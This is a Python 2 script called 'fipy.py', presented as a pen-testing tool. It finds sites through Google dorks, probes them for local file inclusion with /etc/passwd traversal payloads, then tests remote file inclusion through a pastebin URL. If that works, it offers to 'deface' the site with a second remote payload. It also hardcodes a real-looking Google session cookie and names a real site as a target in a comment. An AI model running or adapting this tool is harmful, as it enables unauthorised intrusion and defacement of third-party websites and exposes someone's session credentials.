from termcolor import colored
import webbrowser
import re				# For Regular expresions
from optparse import OptionParser	# For arguments
import requests
from BeautifulSoup import BeautifulSoup
import subprocess
import os
from lxml import html
import urllib2
##url = 'http://companiageneral.com.ar/index.php?main='
"""fipy.py is a tool for pen testers
This tool will find LFI and RFI"""

def main():
	#	Arguments
	parser = OptionParser()
	parser.add_option("-u", "--url", dest="url", help="URL of target", metavar="http://www.somesite.com/index.php?page=")
	parser.add_option("-c", "--crawl", action="store_true", dest="crawl", default=False, help="Crawl website enabled")	
        parser.add_option("-d", "--dork", action="store_true", dest="dork", help="provide a google dork", metavar="'.php?page='")


	(options, args) = parser.parse_args()	
	
	#	Error handaling
	if (options.url == None) & (options.dork == None):
		print(parser.usage)
		exit(0)
	
	#	Adding arguments
	else:
		url = options.url
		crawl = str(options.crawl)
		dork = options.dork 

	banner()
	#print(url, crawl, dork)
	# Branch 
	if dork != None:
		#dorkLinks(dork)
		dorks()
	if url != None:
		testFI(url)	
	

def banner():
	print(colored('   ___                                                      ', 'red'))
	print(colored(" /'___\ __                                                  '", 'red'))
	print(colored('/\ \__//\_\  _____   _____   __  __       _____   __  __    ', 'red'))
	print(colored("\ \ ,__\/\ \/\ '__`\/\ '__`\/\ \/\ \     /\ '__`\/\ \/\ \   '", 'green'))
	print(colored(' \ \ \_/\ \ \ \ \L\ \ \ \L\ \ \ \_\ \  __\ \ \L\ \ \ \_\ \  ', 'green'))
        print(colored('  \ \_\  \ \_\ \ ,__/\ \ ,__/\/`____ \/\_\\ \ ,__/\/`____ \ ', 'green'))
	print(colored('   \/_/   \/_/\ \ \/  \ \ \/  `/___/> \/_/ \ \ \/  `/___/> \"', 'red'))
	print(colored('               \ \_\   \ \_\     /\___/     \ \_\     /\___/ ', 'red'))      
        print(colored('                \/_/    \/_/     \/__/       \/_/     \/__/ ', 'red'))
	
            
          
def dorks():
	urls = []
	os.system('echo 1 > workfile.txt')
	print("example dork:	phpgwapi/setup/tables_update.inc.php?appdir=")
	os.system('python dork.py')
	f = open('workfile.txt', 'r')
	for line in f:
		urls.append(line.rstrip())
	print(urls)
	for x in range(0, len(urls)):
		if "?" in urls[x]:
			if "=" in urls[x]:
				newURL=urls[x].replace('amp;', "")
				testFI(newURL)	

def urlEncode(dork):
	#Used to encode URL
	dork = dork.replace('?', '%3F')
	dork = dork.replace(':', '%3A')
	dork = dork.replace('=', '%3D')
	dork = dork.replace('/', '%2F')

	return str(dork)

def urlDecode(dork):
        #Used to Decode URL
        dork = dork.replace('%3F', '?')
        dork = dork.replace('%3A', ':')
        dork = dork.replace('%3D', '=')
	dork = dork.replace('%2F', '/')

 
        return str(dork)


def dorkLinks(dork):
	dork = "http://google.com/search?q=" + urlEncode(dork)
	print("url visiting: " + dork)
	headers = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36'}
	googlesearch = requests.get(dork, headers=headers)
	tree = html.fromstring(googlesearch.content)
	links = tree.xpath('/html/body//tbody/tr/td/a[@title]/@href')
	print(links)

	targs = []

	for elt in tree.xpath('//a'):
    		print(elt.attrib['href'], elt.text_content())
	potLinks = []
	
	identifier = "/url?q="
	print(targs)
	for x in range(0, len(targs)):
		print("Testing: " + str(targs[x]))
		testing = str(targs[x])
		location = str(testing.find(identifier))
        	if location != "-1":
	        	print('[+] URL found')
			potLinks.append(testing)
	print(potLinks)



	print("\n pot links" + str(potLinks))	
	#print(googlesearch.cookies)
	#print(googlesearch.text)
	
	print(googlesearch)
	error = "Our systems have detected unusual"
	if error in googlesearch.text:
		
	#	This condition is true when google give you a capacha to enter
		print("FUCKING GOOGLE M8")
		f = open('del.txt', 'w')
		f.write(str(googlesearch.text))
		f = open('del.txt', 'r')
		
		print(googlesearch.text)
		os.system('cat del.txt | grep sorry > outfile')
		f2 = open('outfile', 'r')
		imgurl = f2.read()
		sorry = re.findall('"([^"]*)"', imgurl)
		errURL = "http://ipv4.google.com" + sorry[0]
		print('error URL:' + errURL)
		newerrurl = errURL.replace("amp;","")
		print('decodedURL:' + newerrurl)
		
		##Generate new headers 
		
		errsearch = requests.get(newerrurl, headers = headers)
		
		command = "wget -O capacha " + "'"
		command = command + newerrurl + "'"
		
		os.system(command)
		
               
		command = "jp2a --colors --chars='..00xx@@' capacha"
		os.system(command)
		
		print("Click me for capatcha:" + newerrurl)
			
		print('\n' + 'you can find the image of the capacha in the fipy folder if ascii art is unclear')
		capchaAns = raw_input ("Please enter in the capacha ")
		print ("Trying: " + capchaAns)
		
		parma = re.search('q=([a-zA-Z0-9-]{0,251})', newerrurl)
		parmeter = parma.group(0)
		parmeter = parmeter.replace("q=", "") 
		##get the q parameter from url 		
		print("new URL:" + newerrurl) 

		url = "https://ipv4.google.com/sorry/index?captcha=" + capchaAns + "&q=" + parmeter + "&continue=" + 'https%3A%2F%2Fwww.google.co.uk%2Fsearch%3Fespv%3D2%26biw%3D1284%26bih%3D941%26q%3Dinurl%253Aadmin%26oq%3Dinurl%253Aadmin%26gs_l%3Dserp.3...1464.2586.0.2818.5.5.0.0.0.0.97.345.5.5.0....0...1c.1.64.serp..0.0.0.MpPUEwrJvuY&submit=Submit'# + urlEncode(dork)+ '%26gs_l%3Dserp.3...1464.2586.0.2818.5.5.0.0.0.0.97.345.5.5.0....0...1c.1.64.serp..0.0.0.MpPUEwrJvuY' + "&submit=submit"
		print(url)
		#new headers 
		headers = {'authority': 'www.google.com' ,'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36', 'cookie': 'SID=3QPG7DlqYP308gr0W9PZPSeQKKYUNYI4z8H1ZNJF-5dpWDnRC663kl_uIzKBfAlwzjIRdw.; HSID=ArIqlKmAp09OmO9Zk; SSID=A_fSZ13Pf65sQclDf; APISID=ypmmvYEJJTjzuHXr/ADxOYaHMN-T-OkjaL; SAPISID=zmKe0hzuKkm3MdGi/AS8uiWBax2Jl_bnJX; CONSENT=YES+GB.en-GB+20150816-15-0; OGPC=5062105-2:5062129-4:5062135-19:5062172-6:5062204-8:5062220-2:420206592-77:538779648-19:5062226-12:; NID=88=zFkF9CE8SdoBn9xIIH-7H560MpVB2fpuCLnsypdU6iMxCpibmO5nhylrdZ-hp-pnWLkP3ncva_RRErGfxET71oGr2AlNGpxMKMsjvq6_KquPXrewIC5sOTH7MEp0OF2MqdBe3ww72HXaxjS-Gx4s3a9h1EMksbIR-BO_irZjSJ_reVrOZsVDqQ2LhKLZ8nwLnKKmQAZh_Ec5jtZ6EaUyE0xPuM0DQp8; DV=glykpjD7RdlLULieIn9Kx39ONl-jr8pF8ZpxGWgmAgAAADCL4JiaprCvCQAAgACYPh6Aid2jCwAAAA'}
		googlesearch = requests.get(url, headers=headers)
		print(googlesearch.text)
		

		
		

def testFI(url):
	#	Exploit list
	paraList = ['/etc/passwd','../etc/passwd','../../etc', '../../../etc' , '../../../../etc/passwd', '../../../../../etc/passwd', '../../../../../../etc/passwd']
	

	print('\n' * 3)
	yesno = raw_input("Do you want to test " + url + "? (y/n):")
	if yesno == "n":
		return 
	
	head, sep, tail = url.partition('=')
	url = head + "="
	
	print(url)
	
	temp = 0

	for x in range(0, 6):
		try:
			trying = url + paraList[x]
			print(trying)
			response = urllib2.urlopen(url + paraList[x])
			html = response.read()
			location = str(html.find('root:x'))
			if location != "-1":
				print('\n' *3)
				out = '[+]' +  "LFI exploit found at: " + url + str(paraList[x])
				print(colored(out, 'green'))
				yesno = raw_input("Do you want to open in web browser? (y/n):")
				if yesno == "y":
					webbrowser.open(trying)
				yesno = raw_input("Do you want to test for RFI? (y/n):")
                                if yesno == "y":
					remoteFI(url)
				return
		except:
			print(colored('failed', 'red'))
			return 
	temp = 0 

	for x in range(0, 6):
        	try:
			trying = url + paraList[x] + "%00"
                        print(trying)
			response = urllib2.urlopen(trying + paraList[x] + "%00")
        	        html = response.read()
               		location = str(html.find('root:x'))
               		if location != "-1":
				webbrowswer.open(trying)
				print('\n' * 6)
                       		print('[+]' + 'LFI exploit found at: ' + url + str(paraList[x]))
				remoteFI(url)
				return
		except:
			print('failed')

	print(colored('[-] Not Vulnerable', 'green'))


def remoteFI(url):
	print("testing:" + url + "http://pastebin.com/raw/NWuWwYhZ")
	
	headers = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36'}
        googlesearch = requests.get(url + "http://pastebin.com/raw/NWuWwYhZ", headers=headers)
	if str(googlesearch.text) == "remote file inclusion time :)":
        	#print('yay')
                out = '[+]' +  "RFI exploit found at: " + url + "http://pastebin.com/raw/NWuWwYhZ"
                print(colored(out, 'green'))
                #print("yay")
		yesno = raw_input("Do you want to deface (y/n):")
                if yesno == "y":
			googlesearch = requests.get(url + "http://pastebin.com/raw/YHEFcnBD", headers=headers)

	else:
		print(colored('[-] Aww no RFI', 'red'))


if __name__ == main():
	main()
